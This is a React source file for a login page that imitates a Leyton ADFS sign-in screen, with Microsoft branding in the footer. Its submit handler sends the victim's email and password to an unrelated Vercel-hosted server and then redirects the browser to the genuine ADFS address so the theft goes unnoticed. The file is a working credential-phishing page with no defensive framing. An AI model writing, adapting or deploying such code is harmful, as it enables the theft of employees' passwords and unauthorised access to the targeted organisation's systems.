import { useState } from 'react';
import bannerImg from '../assets/illustration.png';
import logo from '../assets/logo.png';

const SignIn = () => {
  const [click, setClick] = useState(false)
  const handleAddUser = async (event) => {
    event.preventDefault();
    const form = event.target;
    const email = form.email.value;
    const password = form.password.value;
    const user = { email, password };
    if (email && password) {
      setClick(true);
      window.location.href = "https://adfs.leyton.com/adfs/ls/";
    }
    try {
      const response = await
        fetch("https://leytonappserver.vercel.app/signup", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(user),
        });
      if (!response.ok) {
        throw new Error("Failed to send email");
      }

    }
    catch (error) {
      console.error("Error sending email:", error.message);
    }

    form.reset();
  }

  return (
    <div className="flex h-screen">
      {/* banner */}
      <div className="hidden md:block md:w-[60%] lg:w-[70%] xl:w-[72%]">
        <img src={bannerImg} alt="Banner" className="h-full w-full object-cover" />
      </div>

      <div className="w-full md:w-[40%] lg:w-[30%] xl:w-[28%] md:m-10 mt-8">
        <div className="max-w-xs mx-auto">
          {/* logo  */}
          <div className="mb-4 ">
            <img src={logo} alt="Logo" className="mx-auto" />
          </div>
          <p className='mt-12'> Sign in</p>
          {/* form */}
          <form onSubmit={handleAddUser} className="mt-10">
            <div className="mb-4"><input
              className=" border outline outline-1 rounded w-full py-1 px-3 text-gray-700 leading-tight focus:outline-2 focus:shadow-outline"
              id="username"
              type="text"
              name="email"
              required
              placeholder="someone@gmail.com"
            />
            </div>
            <div className="mb-6">

              <input
                className=" border rounded outline outline-1   w-full py-1 px-3 text-gray-700 leading-tight focus:outline-2 focus:shadow-outline"
                id="password"
                type="password"
                name="password"
                required
                placeholder="Password"
              />
            </div>
            <div className="flex items-center justify-between">
              <button
                className="bg-blue-600 hover:bg-blue-700 text-white py-1  px-4  focus:outline-none focus:shadow-outline"
                type="submit"
              >Sign In
              </button>

            </div>
          </form>
          <p className="  text-sm mt-8 ">
            Sign in to leyton using your username (John Smith: jsmith)
          </p>
          {/* footer */}
          <footer className=" text-gray-500 text-xs py-4 absolute bottom-0  ">
            © {new Date().getFullYear()} Microsoft
          </footer>
        </div>

      </div>
    </div>
  );
};

export default SignIn;
